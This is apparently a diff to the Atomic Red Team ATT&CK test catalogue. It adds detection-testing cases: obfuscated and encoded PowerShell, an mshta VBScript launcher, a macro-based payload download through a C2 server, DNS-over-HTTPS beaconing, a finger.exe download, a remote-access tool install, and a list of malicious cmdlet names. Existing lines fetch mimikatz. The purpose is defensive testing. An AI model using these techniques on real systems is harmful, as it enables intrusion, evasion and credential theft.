@@ -552,17 +552,23 @@ credential-access:
 
 '
       supported_platforms:
-      - macos
-      - linux
+      - containers
       input_arguments:
         namespace:
           description: K8s namespace to list
           type: String
           default: default
-      executor:
+      dependencies:
+      - description: 'kubectl must be installed
+
+'
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+'
         prereq_command: 'which kubectl
 
 '
+      executor:
         command: 'kubectl get secrets -n #{namespace}
 
 '
@@ -631,7 +637,9 @@ credential-access:
 
 '
         name: sh
-        cleanup_command: kubectl --context kind-atomic-cluster delete pod atomic-pod
+        cleanup_command: 'kubectl --context kind-atomic-cluster delete pod atomic-pod
+
+'
   T1056.004:
     technique:
       external_references:
@@ -2337,6 +2345,18 @@ credential-access:
         there is no output\n"
       supported_platforms:
       - windows
+      dependencies:
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -11009,17 +11029,23 @@ privilege-escalation:
 
 '
       supported_platforms:
-      - linux
-      - macos
+      - containers
       input_arguments:
         namespace:
           description: K8s namespace to list
           type: String
           default: default
-      executor:
+      dependencies:
+      - description: 'kubectl must be installed
+
+'
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+'
         prereq_command: 'which kubectl
 
 '
+      executor:
         command: 'kubectl get cronjobs -n #{namespace}
 
 '
@@ -11036,17 +11062,23 @@ privilege-escalation:
 
 '
       supported_platforms:
-      - linux
-      - macos
+      - containers
       input_arguments:
         namespace:
           description: K8s namespace to list
           type: String
           default: default
-      executor:
+      dependencies:
+      - description: 'kubectl must be installed
+
+'
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+'
         prereq_command: 'which kubectl
 
 '
+      executor:
         command: 'kubectl create -f src/cronjob.yaml -n #{namespace}
 
 '
@@ -11568,7 +11600,7 @@ privilege-escalation:
       - Containers
       identifier: T1078.001
     atomic_tests:
-    - name: Enable Guest account with RDP capability and admin priviliges
+    - name: Enable Guest account with RDP capability and admin privileges
       auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
       description: |
         After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
@@ -12434,7 +12466,7 @@ privilege-escalation:
         - https://twitter.com/mauilion/status/1129468485480751104
         - https://securekubernetes.com/scenario_2_attack/
       supported_platforms:
-      - linux
+      - containers
       dependency_executor_name: sh
       dependencies:
       - description: Verify docker is installed.
@@ -13470,7 +13502,7 @@ privilege-escalation:
           if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
           sudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}
           sudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}
-        cleanup: |
+        cleanup_command: |
           sudo launchctl unload ~/Library/LaunchAgents/#{plist_filename}
           sudo rm ~/Library/LaunchAgents/#{plist_filename}
   T1543.004:
@@ -13726,7 +13758,7 @@ privilege-escalation:
       x_mitre_version: '1.1'
       identifier: T1078.003
     atomic_tests:
-    - name: Create local account with admin priviliges
+    - name: Create local account with admin privileges
       auto_generated_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
       description: After execution the new account will be active and added to the
         Administrators group
@@ -15872,7 +15904,7 @@ privilege-escalation:
         command: 'sudo defaults write com.apple.loginwindow LoginHook #{script}
 
 '
-        cleanup: 'sudo defaults delete com.apple.loginwindow LoginHook
+        cleanup_command: 'sudo defaults delete com.apple.loginwindow LoginHook
 
 '
         elevation_required: true
@@ -16350,7 +16382,7 @@ privilege-escalation:
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /S #{target} /RU #{user_name} /RP #{password}
+        cleanup_command: 'SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password}
           /TN "Atomic task" /F >nul 2>&1
 
 '
@@ -21793,7 +21825,7 @@ defense-evasion:
       - Containers
       identifier: T1078.001
     atomic_tests:
-    - name: Enable Guest account with RDP capability and admin priviliges
+    - name: Enable Guest account with RDP capability and admin privileges
       auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
       description: |
         After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
@@ -27343,7 +27375,7 @@ defense-evasion:
       x_mitre_version: '1.1'
       identifier: T1078.003
     atomic_tests:
-    - name: Create local account with admin priviliges
+    - name: Create local account with admin privileges
       auto_generated_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
       description: After execution the new account will be active and added to the
         Administrators group
@@ -28655,6 +28687,28 @@ defense-evasion:
         command: 'Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath
           #{mshta_file_path}'
         name: powershell
+    - name: Mshta used to Execute PowerShell
+      auto_generated_guid: 8707a805-2b76-4f32-b1c0-14e558205772
+      description: 'Use Mshta to execute arbitrary PowerShell. Example is from the
+        2021 Threat Detection Report by Red Canary.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        message:
+          description: Encoded message to include
+          type: string
+          default: Hello,%20MSHTA!
+        seconds_to_sleep:
+          description: How many seconds to sleep/wait
+          type: string
+          default: 5
+      executor:
+        command: 'mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""powershell.exe%20-nop%20-Command%20Write-Host%20#{message};Start-Sleep%20-Seconds%20#{seconds_to_sleep}"""))</script>''"
+
+'
+        name: command_prompt
   T1218.007:
     technique:
       id: attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336
@@ -29531,6 +29585,25 @@ defense-evasion:
 
 '
         name: powershell
+    - name: Obfuscated Command in PowerShell
+      auto_generated_guid: 8b3f4ed6-077b-4bdd-891c-2d237f19410f
+      description: 'This is an obfuscated PowerShell command which when executed prints
+        "Hello, from PowerShell!". Example is from the 2021 Threat Detection Report
+        by Red Canary.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: '$cmDwhy =[TyPe]("{0}{1}" -f ''S'',''TrING'')  ;   $pz2Sb0  =[TYpE]("{1}{0}{2}"-f''nv'',''cO'',''ert'')  ;  &("{0}{2}{3}{1}{4}"
+          -f''In'',''SiO'',''vOKe-EXp'',''ReS'',''n'') (  (&("{1}{2}{0}"-f''blE'',''gET-'',''vaRIA'')  (''CMdw''+''h''+''y''))."v`ALUe"::("{1}{0}"
+          -f''iN'',''jO'').Invoke('''',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163
+          , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40,
+          120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .(''%'') { (
+          [CHAR] (  $Pz2sB0::"t`OinT`16"(( [sTring]${_}) ,8)))})) )
+
+'
+        name: powershell
   T1218.008:
     technique:
       id: attack-pattern--6e3bd510-6b33-41a4-af80-2d80f3ee0071
@@ -29965,7 +30038,7 @@ defense-evasion:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210724/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -39273,17 +39346,23 @@ persistence:
 
 '
       supported_platforms:
-      - linux
-      - macos
+      - containers
       input_arguments:
         namespace:
           description: K8s namespace to list
           type: String
           default: default
-      executor:
+      dependencies:
+      - description: 'kubectl must be installed
+
+'
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+'
         prereq_command: 'which kubectl
 
 '
+      executor:
         command: 'kubectl get cronjobs -n #{namespace}
 
 '
@@ -39300,17 +39379,23 @@ persistence:
 
 '
       supported_platforms:
-      - linux
-      - macos
+      - containers
       input_arguments:
         namespace:
           description: K8s namespace to list
           type: String
           default: default
-      executor:
+      dependencies:
+      - description: 'kubectl must be installed
+
+'
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+'
         prereq_command: 'which kubectl
 
 '
+      executor:
         command: 'kubectl create -f src/cronjob.yaml -n #{namespace}
 
 '
@@ -39834,7 +39919,7 @@ persistence:
       - Containers
       identifier: T1078.001
     atomic_tests:
-    - name: Enable Guest account with RDP capability and admin priviliges
+    - name: Enable Guest account with RDP capability and admin privileges
       auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
       description: |
         After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
@@ -41492,7 +41577,7 @@ persistence:
           if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
           sudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}
           sudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}
-        cleanup: |
+        cleanup_command: |
           sudo launchctl unload ~/Library/LaunchAgents/#{plist_filename}
           sudo rm ~/Library/LaunchAgents/#{plist_filename}
   T1543.004:
@@ -41940,7 +42025,7 @@ persistence:
       x_mitre_version: '1.1'
       identifier: T1078.003
     atomic_tests:
-    - name: Create local account with admin priviliges
+    - name: Create local account with admin privileges
       auto_generated_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
       description: After execution the new account will be active and added to the
         Administrators group
@@ -44036,7 +44121,7 @@ persistence:
         command: 'sudo defaults write com.apple.loginwindow LoginHook #{script}
 
 '
-        cleanup: 'sudo defaults delete com.apple.loginwindow LoginHook
+        cleanup_command: 'sudo defaults delete com.apple.loginwindow LoginHook
 
 '
         elevation_required: true
@@ -44664,7 +44749,7 @@ persistence:
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /S #{target} /RU #{user_name} /RP #{password}
+        cleanup_command: 'SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password}
           /TN "Atomic task" /F >nul 2>&1
 
 '
@@ -58011,8 +58096,7 @@ execution:
 
 '
       supported_platforms:
-      - linux
-      - macos
+      - containers
       input_arguments:
         namespace:
           description: K8s namespace to use
@@ -58022,10 +58106,17 @@ execution:
           description: Command to run
           type: String
           default: uname
-      executor:
+      dependencies:
+      - description: 'kubectl must be installed
+
+'
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+'
         prereq_command: 'which kubectl
 
 '
+      executor:
         command: |
           kubectl create -f src/busybox.yaml -n #{namespace}
           kubectl exec -n #{namespace} busybox -- #{command}
@@ -58102,17 +58193,23 @@ execution:
 
 '
       supported_platforms:
-      - linux
-      - macos
+      - containers
       input_arguments:
         namespace:
           description: K8s namespace to list
           type: String
           default: default
-      executor:
+      dependencies:
+      - description: 'kubectl must be installed
+
+'
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+'
         prereq_command: 'which kubectl
 
 '
+      executor:
         command: 'kubectl get cronjobs -n #{namespace}
 
 '
@@ -58129,17 +58226,23 @@ execution:
 
 '
       supported_platforms:
-      - linux
-      - macos
+      - containers
       input_arguments:
         namespace:
           description: K8s namespace to list
           type: String
           default: default
-      executor:
+      dependencies:
+      - description: 'kubectl must be installed
+
+'
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+'
         prereq_command: 'which kubectl
 
 '
+      executor:
         command: 'kubectl create -f src/cronjob.yaml -n #{namespace}
 
 '
@@ -59331,6 +59434,89 @@ execution:
         cleanup_command: 'Remove-Item #{pua_file}
 
 '
+    - name: Office Generic Payload Download
+      auto_generated_guid: 5202ee05-c420-4148-bf5e-fd7f7d24850c
+      description: |
+        This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.
+        Required input agruments are c2_domain and file_name
+        Execution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
+        Example for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder
+        Example input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt
+      supported_platforms:
+      - windows
+      input_arguments:
+        macro_path:
+          description: 'Location of file which will be converted to a VBA macro
+
+'
+          type: Path
+          default: PathToAtomicsFolder/T1204.002/src/test9-GenericPayloadDownload.txt
+        c2_domain:
+          description: 'This required variable points to a user defined HTTP server
+            that will host the file_name in the c2_parent_directory.
+
+'
+          type: url
+          default: "$false"
+        c2_parent_directory:
+          description: |
+            Parent directory where you have the "malicious" file on c2_domain server.
+            Will default to root directory. Forward slashes are not needed at begining or ending of directory path
+          type: Path
+          default: ''
+        file_name:
+          description: |
+            "Malicious" file to be downloaded.
+            This required file needs to be place on the user provided c2 domain
+            Example file can be found at PathToAtomicsFolder/T1204.002/src/test9-example-payload.txt
+          type: String
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt
+        ms_product:
+          description: 'Maldoc application Word or Excel
+
+'
+          type: String
+          default: Word
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Destination c2_domain name or IP address must be set to a running
+          HTTP server.
+
+'
+        prereq_command: 'if (#{c2_domain}) (exit 0) else (exit 1)
+
+'
+        get_prereq_command: 'Write-Host "Destination c2 server domain name or IP address
+          must be set and reachable for HTTP service"
+
+'
+      - description: 'Microsoftt #{ms_product} must be installed
+
+'
+        prereq_command: |
+          try {
+            New-Object -COMObject "#{ms_product}.Application" | Out-Null
+            $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
+            Stop-Process -Name $process
+            exit 0
+          } catch { exit 1 }
+        get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
+          manually to meet this requirement"
+
+'
+      executor:
+        name: powershell
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+          $macroCode = Get-Content "#{macro_path}" -Raw
+          $URL = "#{c2_domain}" + "/" + "#{c2_parent_directory}"
+          $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', "#{file_name}"
+          Invoke-MalDoc -macroCode $macroCode -officeProduct "#{ms_product}"
+        cleanup_command: 'Remove-Item "C:\Users\$env:username\Desktop\#{file_name}"
+          -ErrorAction Ignore
+
+'
   T1204.003:
     technique:
       external_references:
@@ -60105,6 +60291,55 @@ execution:
           -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute
           -ErrorAction Stop'
         name: powershell
+    - name: PowerShell Command Execution
+      auto_generated_guid: a538de64-1c74-46ed-aa60-b995ed302598
+      description: 'Use of obfuscated PowerShell to execute an arbitrary command;
+        outputs "Hello, from PowerShell!". Example is from the 2021 Threat Detection
+        Report by Red Canary.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        obfuscated_code:
+          description: 'Defaults to: Invoke-Expression with a "Write-Host" line.'
+          type: string
+          default: JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
+      executor:
+        command: 'powershell.exe -e  #{obfuscated_code}
+
+'
+        name: command_prompt
+    - name: PowerShell Invoke Known Malicious Cmdlets
+      auto_generated_guid: 49eb9404-5e0f-4031-a179-b40f7be385e3
+      description: Powershell execution of known Malicious PowerShell Cmdlets
+      supported_platforms:
+      - windows
+      input_arguments:
+        Malicious_cmdlets:
+          description: Known Malicious Cmdlets
+          type: String
+          default: '"Add-Persistence", "Find-AVSignature", "Get-GPPAutologon", "Get-GPPPassword",
+            "Get-HttpStatus", "Get-Keystrokes", "Get-SecurityPackages", "Get-TimedScreenshot",
+            "Get-VaultCredential", "Get-VolumeShadowCopy", "Install-SSP", "Invoke-CredentialInjection",
+            "Invoke-DllInjection", "Invoke-Mimikatz", "Invoke-NinjaCopy", "Invoke-Portscan",
+            "Invoke-ReflectivePEInjection", "Invoke-ReverseDnsLookup", "Invoke-Shellcode",
+            "Invoke-TokenManipulation", "Invoke-WmiCommand", "Mount-VolumeShadowCopy",
+            "New-ElevatedPersistenceOption", "New-UserPersistenceOption", "New-VolumeShadowCopy",
+            "Out-CompressedDll", "Out-EncodedCommand", "Out-EncryptedScript", "Out-Minidump",
+            "PowerUp", "PowerView", "Remove-Comments", "Remove-VolumeShadowCopy",
+            "Set-CriticalProcess", "Set-MasterBootRecord"
+
+'
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |-
+          $malcmdlets = #{Malicious_cmdlets}
+          foreach ($cmdlets in $malcmdlets) {
+              "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"}
+          foreach ($cmdlets in $malcmdlets) {
+              $cmdlets}
   T1059.006:
     technique:
       external_references:
@@ -60460,7 +60695,7 @@ execution:
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /S #{target} /RU #{user_name} /RP #{password}
+        cleanup_command: 'SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password}
           /TN "Atomic task" /F >nul 2>&1
 
 '
@@ -61581,6 +61816,27 @@ execution:
 
 '
         name: command_prompt
+    - name: Suspicious Execution via Windows Command Shell
+      auto_generated_guid: d0eb3597-a1b3-4d65-b33b-2cda8d397f20
+      description: 'Command line executed via suspicious invocation. Example is from
+        the 2021 Threat Detection Report by Red Canary.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        output_file:
+          description: File to output to
+          type: string
+          default: hello.txt
+        input_message:
+          description: Message to write to file
+          type: string
+          default: Hello, from CMD!
+      executor:
+        command: "%LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file}
+          & type #{output_file}\n"
+        name: command_prompt
   T1047:
     technique:
       id: attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055
@@ -62349,7 +62605,7 @@ lateral-movement:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210724/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -65221,6 +65477,46 @@ command-and-control:
         cleanup_command: 'rm -f #{output_file}
 
 '
+    - name: File Download via PowerShell
+      auto_generated_guid: 54a4daf1-71df-4383-9ba7-f1a295d8b6d2
+      description: 'Use PowerShell to download and write an arbitrary file from the
+        internet. Example is from the 2021 Threat Detection Report by Red Canary.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        target_remote_file:
+          description: File to download
+          type: string
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt
+        output_file:
+          description: File to write to
+          type: string
+          default: LICENSE.txt
+      executor:
+        command: "(New-Object Net.WebClient).DownloadString('#{target_remote_file}')
+          | Out-File #{output_file}; Invoke-Item #{output_file}\n"
+        name: powershell
+    - name: File download with finger.exe on Windows
+      auto_generated_guid: 5f507e45-8411-4f99-84e7-e38530c45d01
+      description: |
+        Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.
+        Because this is being tested on the localhost, you should not be expecting a successful connection
+        https://www.exploit-db.com/exploits/48815
+        https://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_host:
+          description: Remote hostname or IP address
+          type: String
+          default: localhost
+      executor:
+        name: command_prompt
+        command: 'finger base64_filedata@#{remote_host}
+
+'
   T1090.001:
     technique:
       external_references:
@@ -66072,7 +66368,118 @@ command-and-control:
       - Linux
       - macOS
       - Windows
-    atomic_tests: []
+      identifier: T1572
+    atomic_tests:
+    - name: DNS over HTTPS Large Query Volume
+      auto_generated_guid: ae9ef4b0-d8c1-49d4-8758-06206f19af0a
+      description: |
+        This test simulates an infected host sending a large volume of DoH queries to a command and control server.
+        The intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.
+        A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
+      supported_platforms:
+      - windows
+      input_arguments:
+        doh_server:
+          description: Default DoH resolver
+          type: string
+          default: https://8.8.8.8/resolve
+        query_type:
+          description: DNS query type
+          type: string
+          default: TXT
+        subdomain:
+          description: Subdomain prepended to the domain name
+          type: string
+          default: atomicredteam
+        query_volume:
+          description: Number of DNS queries to send
+          type: integer
+          default: '1000'
+        domain:
+          description: Default domain to simulate against
+          type: string
+          default: 127.0.0.1.xip.io
+      executor:
+        command: 'for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest "#{doh_server}?name=#{subdomain}.$(Get-Random
+          -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}" -UseBasicParsing).Content
+          }
+
+'
+        name: powershell
+    - name: DNS over HTTPS Regular Beaconing
+      auto_generated_guid: 0c5f9705-c575-42a6-9609-cbbff4b2fc9b
+      description: |
+        This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.
+        This behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.
+        A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
+      supported_platforms:
+      - windows
+      input_arguments:
+        doh_server:
+          description: Default DoH resolver
+          type: string
+          default: https://8.8.8.8/resolve
+        runtime:
+          description: Time in minutes to run the simulation
+          type: integer
+          default: '30'
+        domain:
+          description: Default domain to simulate against
+          type: string
+          default: 127.0.0.1.xip.io
+        subdomain:
+          description: Subdomain prepended to the domain name
+          type: string
+          default: atomicredteam
+        query_type:
+          description: DNS query type
+          type: string
+          default: TXT
+        c2_interval:
+          description: Seconds between C2 requests to the command and control server
+          type: integer
+          default: '30'
+        c2_jitter:
+          description: Percentage of jitter to add to the C2 interval to create variance
+            in the times between C2 requests
+          type: integer
+          default: '20'
+      executor:
+        command: |
+          Set-Location PathToAtomicsFolder
+          .\T1572\src\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
+        name: powershell
+    - name: DNS over HTTPS Long Domain Query
+      auto_generated_guid: 748a73d5-cea4-4f34-84d8-839da5baa99c
+      description: |
+        This test simulates an infected host returning data to a command and control server using long domain names.
+        The simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.
+         Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
+      supported_platforms:
+      - windows
+      input_arguments:
+        doh_server:
+          description: Default DoH resolver
+          type: string
+          default: https://8.8.8.8/resolve
+        query_type:
+          description: DNS query type
+          type: string
+          default: TXT
+        subdomain:
+          description: Subdomain prepended to the domain name (should be 63 characters
+            to test maximum length)
+          type: string
+          default: atomicredteamatomicredteamatomicredteamatomicredteamatomicredte
+        domain:
+          description: Default domain to simulate against
+          type: string
+          default: 127.0.0.1.xip.io
+      executor:
+        command: |
+          Set-Location PathToAtomicsFolder
+          .\T1572\src\T1572-doh-domain-length.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
+        name: powershell
   T1090:
     technique:
       created: '2017-05-31T21:31:08.479Z'
@@ -66240,6 +66647,23 @@ command-and-control:
         cleanup_command: "get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package
           \n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nRemove-Item
           $file1 -ErrorAction Ignore"
+        name: powershell
+        elevation_required: true
+    - name: GoToAssist Files Detected Test on Windows
+      auto_generated_guid: 1b72b3bd-72f8-4b63-a30b-84e91b9c3578
+      description: 'An adversary may attempt to trick the user into downloading GoToAssist
+        and use to establish C2. Download of GoToAssist installer will be at the destination
+        location and ran when sucessfully executed.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe "https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1"
+          $file1 = "C:\Users\" + $env:username + "\Downloads\GoToAssist.exe"
+          Start-Process $file1 /S;
+        cleanup_command: try{$PathToAtomicsFolder/T1219/Bin/GoToCleanup.ps1} catch{}
         name: powershell
         elevation_required: true
   T1132.001:
@@ -67946,7 +68370,7 @@ initial-access:
       - Containers
       identifier: T1078.001
     atomic_tests:
-    - name: Enable Guest account with RDP capability and admin priviliges
+    - name: Enable Guest account with RDP capability and admin privileges
       auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
       description: |
         After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
@@ -68445,7 +68869,7 @@ initial-access:
       x_mitre_version: '1.1'
       identifier: T1078.003
     atomic_tests:
-    - name: Create local account with admin priviliges
+    - name: Create local account with admin privileges
       auto_generated_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
       description: After execution the new account will be active and added to the
         Administrators group
